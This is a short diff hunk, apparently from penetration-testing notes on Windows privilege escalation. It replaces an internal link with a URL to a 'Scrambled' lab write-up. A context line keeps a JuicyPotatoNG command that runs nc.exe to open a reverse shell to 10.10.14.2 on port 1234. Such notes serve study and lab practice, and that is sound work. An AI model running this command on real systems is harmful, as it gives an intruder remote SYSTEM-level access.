@@ -200,7 +200,7 @@ We need to upload it to the machine and execute it as follows:
 JuicyPotatoNG.exe -t * -p C:\Windows\System32\cmd.exe -a "/c C:\Temp\nc.exe -e cmd 10.10.14.2 1234"
 ```
 Examples:
-[[Scramble#^ee02ee]]
+[Scrambled](https://shuciran.github.io/posts/Scrambled/#fnref:seimpersonateprivilege)
 
 ### RogueWinRM
 
